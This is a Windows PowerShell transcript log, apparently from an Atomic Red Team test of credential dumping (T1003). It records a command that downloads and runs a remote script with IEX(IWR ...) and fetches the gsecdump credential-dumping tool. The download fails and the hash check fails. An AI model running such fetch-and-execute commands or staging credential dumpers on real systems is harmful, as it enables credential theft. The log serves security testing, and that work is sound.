@@ -1,0 +1,81 @@
+﻿**********************
+Windows PowerShell 脚本开始
+开始时间: 20230415161645
+用户名: DESKTOP-SP5BHV2\wangjian
+RunAs 用户: DESKTOP-SP5BHV2\wangjian
+配置名称: 
+计算机: DESKTOP-SP5BHV2 (Microsoft Windows NT 10.0.19044.0)
+主机应用程序: powershell.exe & {[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+$parentpath = Split-Path "C:\AtomicRedTeam\atomics\T1003\bin\gsecdump.exe"; $binpath = "$parentpath\gsecdump-v2b5.exe"
+IEX(IWR "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-WebRequestVerifyHash.ps1" -UseBasicParsing)
+if(Invoke-WebRequestVerifyHash "https://web.archive.org/web/20150606043951if_/http://www.truesec.se/Upload/Sakerhet/Tools/gsecdump-v2b5.exe" "$binpath" 94CAE63DCBABB71C5DD43F55FD09CAEFFDCD7628A02A112FB3CBA36698EF72BC){
+ Move-Item $binpath "C:\AtomicRedTeam\atomics\T1003\bin\gsecdump.exe"
+}}
+进程 ID: 10952
+PSVersion: 5.1.19041.2673
+PSEdition: Desktop
+PSCompatibleVersions: 1.0, 2.0, 3.0, 4.0, 5.0, 5.1.19041.2673
+BuildVersion: 10.0.19041.2673
+CLRVersion: 4.0.30319.42000
+WSManStackVersion: 3.0
+PSRemotingProtocolVersion: 2.3
+SerializationVersion: 1.1.0.1
+**********************
+PS>. 'C:\Users\wangjian\Documents\WindowsPowerShell\Microsoft.PowerShell_profile.ps1'
+PS>& {[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+$parentpath = Split-Path "C:\AtomicRedTeam\atomics\T1003\bin\gsecdump.exe"; $binpath = "$parentpath\gsecdump-v2b5.exe"
+IEX(IWR "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-WebRequestVerifyHash.ps1" -UseBasicParsing)
+if(Invoke-WebRequestVerifyHash "https://web.archive.org/web/20150606043951if_/http://www.truesec.se/Upload/Sakerhet/Tools/gsecdump-v2b5.exe" "$binpath" 94CAE63DCBABB71C5DD43F55FD09CAEFFDCD7628A02A112FB3CBA36698EF72BC){
+ Move-Item $binpath "C:\AtomicRedTeam\atomics\T1003\bin\gsecdump.exe"
+}}
+**********************
+Windows PowerShell 脚本开始
+开始时间: 20230415161708
+用户名: DESKTOP-SP5BHV2\wangjian
+RunAs 用户: DESKTOP-SP5BHV2\wangjian
+配置名称: 
+计算机: DESKTOP-SP5BHV2 (Microsoft Windows NT 10.0.19044.0)
+主机应用程序: powershell.exe & {[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+$parentpath = Split-Path "C:\AtomicRedTeam\atomics\T1003\bin\gsecdump.exe"; $binpath = "$parentpath\gsecdump-v2b5.exe"
+IEX(IWR "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-WebRequestVerifyHash.ps1" -UseBasicParsing)
+if(Invoke-WebRequestVerifyHash "https://web.archive.org/web/20150606043951if_/http://www.truesec.se/Upload/Sakerhet/Tools/gsecdump-v2b5.exe" "$binpath" 94CAE63DCBABB71C5DD43F55FD09CAEFFDCD7628A02A112FB3CBA36698EF72BC){
+ Move-Item $binpath "C:\AtomicRedTeam\atomics\T1003\bin\gsecdump.exe"
+}}
+进程 ID: 10952
+PSVersion: 5.1.19041.2673
+PSEdition: Desktop
+PSCompatibleVersions: 1.0, 2.0, 3.0, 4.0, 5.0, 5.1.19041.2673
+BuildVersion: 10.0.19041.2673
+CLRVersion: 4.0.30319.42000
+WSManStackVersion: 3.0
+PSRemotingProtocolVersion: 2.3
+SerializationVersion: 1.1.0.1
+**********************
+PS>CommandInvocation(Out-String):“Out-String”
+>> ParameterBinding(Out-String): 名称 =“InputObject”；值 =“使用“1”个参数调用“OpenRead”时发生异常:“无法连接到远程服务器””
+使用“1”个参数调用“OpenRead”时发生异常:“无法连接到远程服务器”
+所在位置 行:7 字符: 9
++         (New-Object System.Net.WebClient).OpenRead($url).copyto($ms)
++         ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException
+    + FullyQualifiedErrorId : WebException
+使用“1”个参数调用“OpenRead”时发生异常:“无法连接到远程服务器”
+所在位置 行:7 字符: 9
++         (New-Object System.Net.WebClient).OpenRead($url).copyto($ms)
++         ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException
+    + FullyQualifiedErrorId : WebException
+使用“1”个参数调用“OpenRead”时发生异常:“无法连接到远程服务器”
+所在位置 行:7 字符: 9
++         (New-Object System.Net.WebClient).OpenRead($url).copyto($ms)
++         ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException
+    + FullyQualifiedErrorId : WebException
+
+File hash mismatch, expected: 94CAE63DCBABB71C5DD43F55FD09CAEFFDCD7628A02A112FB3CBA36698EF72BC, actual: E3B0C44298FC1C149AFBF4C8996FB92427AE41E4649B934CA495991B7852B855
+PS>$global:?
+True
+**********************
+Windows PowerShell 脚本结束
+结束时间: 20230415161708
+**********************
